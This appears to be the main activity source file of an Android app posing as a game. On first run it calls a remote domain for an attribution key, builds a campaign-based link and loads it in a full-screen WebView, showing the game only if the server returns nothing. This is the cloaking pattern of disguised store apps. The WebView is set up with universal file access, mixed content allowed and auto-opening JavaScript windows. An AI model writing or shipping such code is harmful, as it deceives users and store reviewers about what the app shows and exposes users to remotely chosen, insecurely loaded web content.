package com.basarili.baslangisc

import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.AdjustConfig
import com.adjust.sdk.OnAttributionReadListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.basarili.baslangisc.databinding.ActivityGameBinding
import com.basarili.baslangisc.util.OneTime
import com.basarili.baslangisc.util.log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private companion object {
        const val DOMAIN   = "https://shootsnarlonly.eu/"
        const val CAMPAIGN = "cmpbas"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding
    lateinit var sharedPreferences: SharedPreferences

    var blockBack: () -> Unit = {}

    val screenTypeFlow = MutableStateFlow(ScreenType.None)

    enum class ScreenType {
        None, Game
    }

    private suspend fun requestGet() = CompletableDeferred<String?>().also { continuation ->
        val urlString = "${DOMAIN}LgcrJNwv?$CAMPAIGN=baskeri"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")
                continuation.complete(jsonResponse.getString("value"))
            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()

        sharedPreferences = getSharedPreferences("values", Context.MODE_PRIVATE)
        initWeb()

        val value = sharedPreferences.getString("value", "505") ?: "505"

        try {
            if (value == "505") {
                coroutine.launch(Dispatchers.IO) {
                    val key = requestGet()
                    if (key != null) {
                        val environment = AdjustConfig.ENVIRONMENT_PRODUCTION
                        val config      = AdjustConfig(applicationContext, key, environment)

                        config.setOnAttributionChangedListener { attribution ->
                            val clickLabel = attribution?.clickLabel
                            val campaign   = attribution?.campaign

                            log("result $attribution | $clickLabel | $campaign")

                            val link = "${DOMAIN}LgcrJNwv?$CAMPAIGN=$campaign&labsa=$clickLabel"
                            log("link = $link")
                            sharedPreferences.edit().putString("value", link).apply()
                            showUrl(link)
                        }

                        Adjust.initSdk(config)
                    } else {
                        screenTypeFlow.value = ScreenType.Game
                    }
                }
            } else {
                showUrl(value)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            screenTypeFlow.value = ScreenType.Game
        }

    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Init Web ----------------------------------------------------------------------------------

    private fun initWeb() {
        binding.webView.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()

            onBackPressedDispatcher.addCallback {
                if (canGoBack()) {
                    goBack()
                } else blockBack()
            }
        }
    }

    private fun showUrl(url: String) {
        log("showUrl: $url")
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

        binding.webView.apply {
            isVisible = true
            loadUrl(url)
        }
        setNavBarColor(R.color.white)
        setStatusBarColor(R.color.black, false)
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {

            if(request?.url.toString().contains("basarili/baslangic")) {
                screenTypeFlow.value = ScreenType.Game
            }

            return false
        }
    }

    // Logic -----------------------------------------------------------------------------------------

    fun setNavBarColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = getColor(colorId)
        }
    }

    fun setStatusBarColor(colorId: Int, isLight: Boolean = true) {
        coroutine.launch(Dispatchers.Main) {
            window.statusBarColor = getColor(colorId)
            window.decorView.systemUiVisibility = if (isLight) View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR else 0
        }
    }

    fun removeWeb() {
        coroutine.launch(Dispatchers.Main) {
            binding.root.removeView(binding.webView)
        }
    }

}